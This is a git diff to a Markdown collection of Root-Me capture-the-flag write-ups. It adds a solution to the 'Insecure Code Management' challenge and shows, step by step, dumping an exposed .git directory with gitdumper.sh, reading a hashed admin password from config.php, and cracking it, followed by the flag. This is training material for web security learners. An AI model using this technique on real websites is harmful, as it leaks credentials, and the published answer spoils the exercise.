@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [17/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [18/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -23,7 +23,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 15. [File upload - Double extensions](#file-upload-double-extensions) 🗸
 16. [File upload - MIME type](#file-upload-mime-type) 🗸
 17. [HTTP - Cookies](#http-cookies) 🗸
-18. [Insecure Code Management](#insecure-code-management)
+18. [Insecure Code Management](#insecure-code-management) 🗸
 19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction)
 20. [Directory traversal](#directory-traversal)
 21. [File upload - Null byte](#file-upload-null-byte)
@@ -1682,7 +1682,6 @@ a7n4nizpgQgnPERy89uanf6T4
 
 ---
 
-
 ## HTTP Cookies
 
 - Author: g0uZ
@@ -1744,6 +1743,117 @@ This gives us the password.
 
 ~~~
 ml-SYMPA
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+
+## Insecure Code Management
+
+- Author: Swissky
+- Date: 29 September 2019
+- Points: 20
+- Level: 2
+
+### Statement
+
+Get the password (in clear text) from the admin account.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch61/).
+
+### Resources
+
+1. [documentation](https://git-scm.com/documentation).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+This challenge suggests the website is a git host.  We can find /.git shows us the site directory.  This can be downloaded using the [gitdumper.sh](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh) tool:
+
+~~~shell
+$ gitdumper.sh http://challenge01.root-me.org/web-serveur/ch61/.git/ new
+~~~
+
+Using git, we can look at the files in the archive:
+
+~~~shell
+$ git checkout --
+D	config.php
+D	css/style.css
+D	image/background.jpg
+D	image/logo.png
+D	index.php
+~~~
+
+We can also review logs:
+
+~~~shell
+$ git log
+commit c0b4661c888bd1ca0f12a3c080e4d2597382277b (HEAD -> master)
+Author: John <john@bs-corp.com>
+Date:   Fri Sep 27 20:10:05 2019 +0200
+
+    blue team want sha256!!!!!!!!!
+
+commit 550880c40814a9d0c39ad3485f7620b1dbce0de8
+Author: John <john@bs-corp.com>
+Date:   Mon Sep 23 15:10:07 2019 +0200
+
+    renamed app name
+
+commit a8673b295eca6a4fa820706d5f809f1a8b49fcba
+Author: John <john@bs-corp.com>
+Date:   Sun Sep 22 12:38:32 2019 +0200
+
+    changed password
+
+commit 1572c85d624a10be0aa7b995289359cc4c0d53da
+Author: John <john@bs-corp.com>
+Date:   Thu Sep 12 11:10:06 2019 +0200
+
+    secure auth with md5
+
+commit 5e0e146e2242cb3e4b836184b688a4e8c0e2cc32
+Author: John <john@bs-corp.com>
+Date:   Thu Sep 5 11:10:15 2019 +0200
+
+    Initial commit for the new HR database access
+~~~
+
+We can see the password was changed.  Inflating the archive files, we can review the php files:
+
+~~~shell
+$ git checkout -- .
+$ ls
+config.php  css  image  index.php
+$ cat config.php
+<?php
+	$username = "admin";
+	$password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
+~~~
+
+This is the sha256 hash of the password.  Using an [online unhasing tool]() we can retrieve the PT password.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+s3cureP@ssw0rd
 ~~~
 
 </details>
